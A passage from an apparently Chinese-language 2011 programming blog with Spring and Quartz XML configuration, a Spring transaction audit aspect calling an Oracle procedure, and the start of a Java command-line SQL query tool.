id=&quot;cronAdvice&quot;</span><br><span class="line">		transaction-manager=&quot;transactionManager&quot;&gt;</span><br><span class="line">		&lt;tx:attributes&gt;</span><br><span class="line">			&lt;tx:method name=&quot;get*&quot; read-only=&quot;true&quot; /&gt;</span><br><span class="line">			&lt;tx:method name=&quot;*&quot; read-only=&quot;false&quot; /&gt;</span><br><span class="line">		&lt;/tx:attributes&gt;</span><br><span class="line">	&lt;/tx:advice&gt;</span><br><span class="line"></span><br><span class="line">	&lt;aop:config&gt;</span><br><span class="line">		&lt;aop:pointcut id=&quot;cronOperation&quot;</span><br><span class="line">			expression=&quot;execution(public * xx.yy..*Service(..))&quot; /&gt;</span><br><span class="line">		&lt;aop:advisor advice-ref=&quot;cronAdvice&quot;</span><br><span class="line">			pointcut-ref=&quot;cronOperation&quot; /&gt;</span><br><span class="line">	&lt;/aop:config&gt;</span><br><span class="line"></span><br><span class="line">	&lt;!-- mail --&gt;</span><br><span class="line">	&lt;context:property-placeholder location=&quot;WEB-INF/mail.properties&quot; /&gt;</span><br><span class="line">	&lt;bean id=&quot;mailSender&quot;</span><br><span class="line">		class=&quot;org.springframework.mail.javamail.JavaMailSenderImpl&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;host&quot; value=&quot;$&#123;mail.host&#125;&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;username&quot; value=&quot;$&#123;mail.username&#125;&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;password&quot; value=&quot;$&#123;mail.password&#125;&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;port&quot; value=&quot;$&#123;mail.port&#125;&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;javaMailProperties&quot;&gt;</span><br><span class="line">			&lt;props&gt;</span><br><span class="line">				&lt;prop key=&quot;mail.debug&quot;&gt;false&lt;/prop&gt;</span><br><span class="line">				&lt;prop key=&quot;mail.smtp.auth&quot;&gt;true&lt;/prop&gt;</span><br><span class="line">			&lt;/props&gt;</span><br><span class="line">		&lt;/property&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line">	&lt;bean id=&quot;templateMessage&quot;</span><br><span class="line">		class=&quot;org.springframework.mail.SimpleMailMessage&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;from&quot; value=&quot;$&#123;mail.from&#125;&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>

<p>applicationContext-Quartz.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">  xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;</span><br><span class="line">  xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">  xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;</span><br><span class="line">  xmlns:jee=&quot;http://www.springframework.org/schema/jee&quot;</span><br><span class="line">  xsi:schemaLocation=&quot;</span><br><span class="line">    http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.5.xsd</span><br><span class="line">    http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-2.5.xsd</span><br><span class="line">    http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-2.5.xsd</span><br><span class="line">    http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-2.5.xsd</span><br><span class="line">    http://www.springframework.org/schema/jee http://www.springframework.org/schema/jee/spring-jee-2.5.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;bean id=&quot;ttl006Timer&quot;</span><br><span class="line">    class=&quot;org.springframework.scheduling.quartz.MethodInvokingJobDetailFactoryBean&quot;&gt;</span><br><span class="line">    &lt;property name=&quot;targetObject&quot; ref=&quot;txnSyncJob&quot; /&gt;</span><br><span class="line">    &lt;property name=&quot;targetMethod&quot; value=&quot;run&quot; /&gt;</span><br><span class="line">    &lt;property name=&quot;concurrent&quot; value=&quot;false&quot; /&gt;</span><br><span class="line">  &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">  &lt;bean id=&quot;ttl06cronTrigger&quot;</span><br><span class="line">    class=&quot;org.springframework.scheduling.quartz.CronTriggerBean&quot;&gt;</span><br><span class="line">    &lt;property name=&quot;jobDetail&quot; ref=&quot;ttl006Timer&quot; /&gt;</span><br><span class="line">    &lt;property name=&quot;cronExpression&quot; value=&quot;0/30 * * * * ?&quot; /&gt;</span><br><span class="line">  &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;bean id=&quot;act016Timer&quot;</span><br><span class="line">    class=&quot;org.springframework.scheduling.quartz.MethodInvokingJobDetailFactoryBean&quot;&gt;</span><br><span class="line">    &lt;property name=&quot;targetObject&quot; ref=&quot;activityJob&quot; /&gt;</span><br><span class="line">    &lt;property name=&quot;targetMethod&quot; value=&quot;run&quot; /&gt;</span><br><span class="line">    &lt;property name=&quot;concurrent&quot; value=&quot;false&quot; /&gt;</span><br><span class="line">  &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">  &lt;bean id=&quot;act016cronTrigger&quot;</span><br><span class="line">    class=&quot;org.springframework.scheduling.quartz.CronTriggerBean&quot;&gt;</span><br><span class="line">    &lt;property name=&quot;jobDetail&quot; ref=&quot;act016Timer&quot; /&gt;</span><br><span class="line">    &lt;property name=&quot;cronExpression&quot; value=&quot;0/50 * * * * ?&quot; /&gt;</span><br><span class="line">  &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;bean</span><br><span class="line">    class=&quot;org.springframework.scheduling.quartz.SchedulerFactoryBean&quot; destroy-method=&quot;destroy&quot;&gt;</span><br><span class="line">    &lt;property name=&quot;waitForJobsToCompleteOnShutdown&quot; value=&quot;false&quot;/&gt;</span><br><span class="line">    &lt;property name=&quot;triggers&quot;&gt;</span><br><span class="line">      &lt;list&gt;</span><br><span class="line">        &lt;ref bean=&quot;ttl06cronTrigger&quot; /&gt;</span><br><span class="line">        &lt;ref bean=&quot;act016cronTrigger&quot; /&gt;</span><br><span class="line">      &lt;/list&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">  &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>

<p>web.xml</p>
<pre><code>  &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
  &lt;web-app xmlns=&quot;http://java.sun.com/xml/ns/j2ee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd&quot; version=&quot;2.4&quot;&gt;
    &lt;context-param&gt;
      &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;
      &lt;param-value&gt;/WEB-INF/applicationContext.xml, /WEB-INF/applicationContext-Quartz.xml&lt;/param-value&gt;
    &lt;/context-param&gt;

    &lt;context-param&gt;
      &lt;param-name&gt;log4jConfigLocation&lt;/param-name&gt;
      &lt;param-value&gt;/WEB-INF/classes/log4j.xml&lt;/param-value&gt;
    &lt;/context-param&gt;
    &lt;listener&gt;
      &lt;listener-class&gt;org.springframework.web.util.Log4jConfigListener&lt;/listener-class&gt;
    &lt;/listener&gt;
    &lt;listener&gt;
      &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;
    &lt;/listener&gt;
  &lt;/web-app&gt;
</code></pre>
<p> 参考<br><a target="_blank" rel="noopener" href="http://www.ibm.com/developerworks/websphere/techjournal/0609_alcott/0609_alcott.html">http://www.ibm.com/developerworks/websphere/techjournal/0609_alcott/0609_alcott.html</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Spring事务的一些应用" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-08-30T07:42:24.000Z"><a href="/2011/08/30/Spring%E4%BA%8B%E5%8A%A1%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BA%94%E7%94%A8/">2011-08-30</a></time>
      
      
  
    <h1 class="title"><a href="/2011/08/30/Spring%E4%BA%8B%E5%8A%A1%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BA%94%E7%94%A8/">Spring事务的一些应用</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>  TransactionManager通过TransactionSynchronizationManager进行事务控制，TransactionTemplate就使用transactionManager运行sql。 </p>
<p>  TransactionTemplate -&gt; PlatformTransactionManager  -&gt; TransactionSynchronizationManager </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TransactionTemplate transactionTemplate = new TransactionTemplate(transactionManager);</span><br><span class="line">transactionTemplate.execute(new TransactionCallbackWithoutResult() &#123;</span><br><span class="line">  @Override</span><br><span class="line">  protected void doInTransactionWithoutResult(TransactionStatus arg0) &#123;</span><br><span class="line">    int count = em.createNativeQuery(&quot;delete XX&quot;).executeUpdate();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>  可以利用TransactionAspectSupport.currentTransactionStatus()控制事务状态，利用setRollbackOnly<br>  要知道是否一个活动事务可以用TransactionSynchronizationManager.isActualTransactionActive() </p>
<p>  写了一个Audit，目的在事务结束前调用一个oracle的package，记录所有变化的数据。 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.sql.CallableStatement;</span><br><span class="line">import java.sql.Connection;</span><br><span class="line">import java.sql.SQLException;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import javax.persistence.EntityManager;</span><br><span class="line"></span><br><span class="line">import oracle.jdbc.driver.OracleTypes;</span><br><span class="line"></span><br><span class="line">import org.apache.log4j.Logger;</span><br><span class="line">import org.aspectj.lang.JoinPoint;</span><br><span class="line">import org.aspectj.lang.annotation.After;</span><br><span class="line">import org.aspectj.lang.annotation.Aspect;</span><br><span class="line">import org.aspectj.lang.annotation.Before;</span><br><span class="line">import org.aspectj.lang.annotation.Pointcut;</span><br><span class="line">import org.hibernate.Session;</span><br><span class="line">import org.hibernate.jdbc.Work;</span><br><span class="line">import org.springframework.orm.jpa.EntityManagerFactoryInfo;</span><br><span class="line">import org.springframework.orm.jpa.EntityManagerHolder;</span><br><span class="line">import org.springframework.orm.jpa.LocalEntityManagerFactoryBean;</span><br><span class="line">import org.springframework.stereotype.Component;</span><br><span class="line">import org.springframework.transaction.interceptor.TransactionAspectSupport;</span><br><span class="line">import org.springframework.transaction.support.TransactionSynchronizationManager;</span><br><span class="line"></span><br><span class="line">@Component</span><br><span class="line">@Aspect</span><br><span class="line">public class AuditRecorder &#123;</span><br><span class="line">  private static final Logger log = Logger.getLogger(AuditRecorder.class);</span><br><span class="line"></span><br><span class="line">  @After(&quot;execution(public * xx.yy..*Service.*(..)) &amp;&amp; @annotation(auditable)&quot;)</span><br><span class="line">  public void recordUsage(JoinPoint jp) &#123;</span><br><span class="line">    audit();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private void audit() &#123;</span><br><span class="line">    if (TransactionSynchronizationManager.isActualTransactionActive()) &#123;</span><br><span class="line">      Map map = TransactionSynchronizationManager.getResourceMap();</span><br><span class="line">      log.info(&quot;mapsize &quot; + map.size());</span><br><span class="line">      for (Object key : map.keySet()) &#123;</span><br><span class="line">        log.debug(&quot;key  &quot; + key + &quot; , &quot; + map.get(key));</span><br><span class="line"></span><br><span class="line">        if (key instanceof EntityManagerFactoryInfo) &#123;</span><br><span class="line">          EntityManagerFactoryInfo info = (EntityManagerFactoryInfo) key;</span><br><span class="line"></span><br><span class="line">          String unitName = info.getPersistenceUnitName();</span><br><span class="line">          if (!unitName.contains(&quot;srs&quot;) &amp;&amp; !unitName.contains(&quot;cas&quot;)) &#123;</span><br><span class="line">            log.debug(&quot;call audit procedure.&quot;);</span><br><span class="line">            if (map.get(key) instanceof EntityManagerHolder) &#123;</span><br><span class="line">              EntityManagerHolder emHolder = (EntityManagerHolder) map</span><br><span class="line">                  .get(key);</span><br><span class="line">              EntityManager em = emHolder.getEntityManager();</span><br><span class="line">              Session s = (Session) em.getDelegate();</span><br><span class="line">              s.doWork(new Work() &#123;</span><br><span class="line">                public void execute(Connection conn)</span><br><span class="line">                    throws SQLException &#123;</span><br><span class="line">                  String sql = &quot;&#123;call SP_COMMON.setloginuser(?)&#125;&quot;;</span><br><span class="line">                  CallableStatement call = conn</span><br><span class="line">                      .prepareCall(sql);</span><br><span class="line">                  call.setString(1, &quot;test&quot;);</span><br><span class="line">                  call.executeUpdate();</span><br><span class="line"></span><br><span class="line">                  CallableStatement call2 = conn</span><br><span class="line">                      .prepareCall(&quot;&#123;? = call SP_COMMON.getloginuser&#125;&quot;);</span><br><span class="line">                  call2.registerOutParameter(1,</span><br><span class="line">                      OracleTypes.VARCHAR);</span><br><span class="line">                  call2.executeQuery();</span><br><span class="line"></span><br><span class="line">                  System.out.println(&quot;&lt;&lt; &quot;</span><br><span class="line">                      + call2.getString(1));</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-[转]Oracle中dual表的用途" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-08-11T06:16:26.000Z"><a href="/2011/08/11/%5B%E8%BD%AC%5DOracle%E4%B8%ADdual%E8%A1%A8%E7%9A%84%E7%94%A8%E9%80%94/">2011-08-11</a></time>
      
      
  
    <h1 class="title"><a href="/2011/08/11/%5B%E8%BD%AC%5DOracle%E4%B8%ADdual%E8%A1%A8%E7%9A%84%E7%94%A8%E9%80%94/">(转)Oracle中dual表的用途</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p><a target="_blank" rel="noopener" href="http://blog.csdn.net/dxz_1983/article/details/2632564">http://blog.csdn.net/dxz_1983/article/details/2632564</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-EditPlus-+-JavaFx-编写SQL简易查询器" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-08-02T07:34:05.000Z"><a href="/2011/08/02/EditPlus-+-JavaFx-%E7%BC%96%E5%86%99SQL%E7%AE%80%E6%98%93%E6%9F%A5%E8%AF%A2%E5%99%A8/">2011-08-02</a></time>
      
      
  
    <h1 class="title"><a href="/2011/08/02/EditPlus-+-JavaFx-%E7%BC%96%E5%86%99SQL%E7%AE%80%E6%98%93%E6%9F%A5%E8%AF%A2%E5%99%A8/">EditPlus + JavaFx 编写SQL简易查询器</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="用过DbVisualizer和Oracle-SQL-Developer，感觉有不足之处，遂期望在EditPlus上打造一个简易的SQL查询器。"><a href="#用过DbVisualizer和Oracle-SQL-Developer，感觉有不足之处，遂期望在EditPlus上打造一个简易的SQL查询器。" class="headerlink" title="用过DbVisualizer和Oracle SQL Developer，感觉有不足之处，遂期望在EditPlus上打造一个简易的SQL查询器。"></a>用过DbVisualizer和Oracle SQL Developer，感觉有不足之处，遂期望在EditPlus上打造一个简易的SQL查询器。</h1><h2 id="Query-java-用于在EditPlus上显示结果"><a href="#Query-java-用于在EditPlus上显示结果" class="headerlink" title="Query.java, 用于在EditPlus上显示结果"></a>Query.java, 用于在EditPlus上显示结果</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line">package forest;</span><br><span class="line"></span><br><span class="line">import static java.lang.System.out;</span><br><span class="line"></span><br><span class="line">import java.sql.Connection;</span><br><span class="line">import java.sql.DriverManager;</span><br><span class="line">import java.sql.ResultSet;</span><br><span class="line">import java.sql.ResultSetMetaData;</span><br><span class="line">import java.sql.SQLException;</span><br><span class="line">import java.sql.Statement;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.beanutils.BasicDynaClass;</span><br><span class="line">import org.apache.commons.beanutils.DynaBean;</span><br><span class="line">import org.apache.commons.beanutils.DynaProperty;</span><br><span class="line"></span><br><span class="line">public class Query &#123;</span><br><span class="line">  static Connection conn;</span><br><span class="line">  static String xxUrl = &quot;jdbc:oracle:thin:@192.168.0.1:1521:SP&quot;;</span><br><span class="line">  static String yyUrl = &quot;jdbc:oracle:thin:@192.168.0.2:1521:XE&quot;;</span><br><span class="line">  static String zzUrl = &quot;jdbc:sqlserver://192.168.0.3:1433;DatabaseName=northwind&quot;;</span><br><span class="line">  static List&lt;DynaBean&gt; beans = new ArrayList&lt;DynaBean&gt;();</span><br><span class="line">  static List&lt;String&gt; columnNames = new ArrayList&lt;String&gt;();</span><br><span class="line">  static &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      Class.forName(&quot;oracle.jdbc.driver.OracleDriver&quot;);</span><br><span class="line">      Class.forName(&quot;com.microsoft.sqlserver.jdbc.SQLServerDriver&quot;);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public static List&lt;DynaBean&gt; getBeans() &#123;</span><br><span class="line">    return beans;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public static List&lt;String&gt; getColumnNames() &#123;</span><br><span class="line">    return columnNames;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private static void consoleRunSQL(String sql) throws Exception &#123;</span><br><span class="line">    runSQL(sql);</span><br><span class="line">    StringBuilder sb = new StringBuilder();</span><br><span class="line">    for (DynaBean bean : beans) &#123;</span><br><span class="line">      for (int i = 1; i &lt;= columnNames.size(); i++) &#123;</span><br><span class="line">        String col = columnNames.get(i - 1);</span><br><span class="line">        String row = String.format(&quot;%-18s = %s\n&quot;, col, bean.get(col));</span><br><span class="line">        sb.append(row);</span><br><span class="line">      &#125;</span><br><span class="line">      sb.append(&quot;-------------------------\n\n&quot;);</span><br><span class="line">      sb.append(&quot;total: &quot; + beans.size() + &quot; records.&quot;);</span><br><span class="line">      out.println(sb.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private static void runSQL(String sql) throws Exception &#123;</span><br><span class="line">    if (sql.trim().length() == 0) &#123;</span><br><span class="line">      out.println(&quot;sql is empty.&quot;);</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">    // out.println(&quot;run &quot; + sql);</span><br><span class="line">    ResultSet rs = null;</span><br><span class="line">    Statement stmt = null;</span><br><span class="line"></span><br><span class="line">    out.println(&quot;&quot;);</span><br><span class="line">    if (!sql.startsWith(&quot;select&quot;)) &#123;</span><br><span class="line">      stmt = conn.createStatement();</span><br><span class="line">      int rows = stmt.executeUpdate(sql);</span><br><span class="line">      out.println(rows + &quot; reords has been process.&quot;);</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">      stmt = conn.createStatement(ResultSet.TYPE_FORWARD_ONLY,</span><br><span class="line">          ResultSet.CONCUR_READ_ONLY);</span><br><span class="line">      rs = stmt.executeQuery(sql);</span><br><span class="line">      ResultSetMetaData metaRs = rs.getMetaData();</span><br><span class="line"></span><br><span class="line">      int columns = metaRs.getColumnCount();</span><br><span class="line"></span><br><span class="line">      List&lt;DynaProperty&gt; props = new ArrayList&lt;DynaProperty&gt;();</span><br><span class="line">      for (int i = 1; i &lt;= columns; i++) &#123;</span><br><span class="line">        String colName = metaRs.getColumnName(i).toLowerCase();</span><br><span class="line">        props.add(new DynaProperty(colName, String.class));</span><br><span class="line"></span><br><span class="line">        columnNames.add(colName);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      BasicDynaClass dynaClass = new BasicDynaClass(&quot;JDBCResult&quot;, null,</span><br><span class="line">          props.toArray(new DynaProperty[0]));</span><br><span class="line"></span><br><span class="line">      while (rs.next()) &#123;</span><br><span class="line">        DynaBean bean = dynaClass.newInstance();</span><br><span class="line">        for (int i = 1; i &lt;= columns; i++) &#123;</span><br><span class="line">          bean.set(columnNames.get(i - 1).toLowerCase(), rs</span><br><span class="line">              .getString(i));</span><br><span class="line">        &#125;</span><br><span class="line">        beans.add(bean);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">      if (rs != null) &#123;</span><br><span class="line">        rs.close();</span><br><span class="line">        stmt.close();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public static void launch(String[] args) throws Exception &#123;</span><br><span class="line">    if (args.length &lt; 2) &#123;</span><br><span class="line">      out.println(&quot;enter arguments.&quot;);</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">    if (args[0].equals(&quot;xx&quot;)) &#123;</span><br><span class="line">      initSP();</span><br><span class="line">    &#125; else if (args[0].equals(&quot;yy&quot;)) &#123;</span><br><span class="line">      initSRS();</span><br><span class="line">    &#125; else if (args[0].equals(&quot;zz&quot;)) &#123;</span><br><span class="line">      initCAS();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      out.println(&quot;type is wrong, it should be xx / yy / zz.&quot;);</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">      if (args.length == 2)</span><br><span class="line">        consoleRunSQL(args[1]);</span><br><span class="line">      else</span><br><span class="line">        runSQL(args[2]);</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">      conn.close();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private static void initSP() throws SQLException &#123;</span><br><span class="line">    conn = DriverManager.getConnection(xxUrl, &quot;xx&quot;, &quot;xx&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private static void initSRS() throws SQLException &#123;</span><br><span class="line">    conn = DriverManager.getConnection(yyUrl, &quot;yy&quot;, 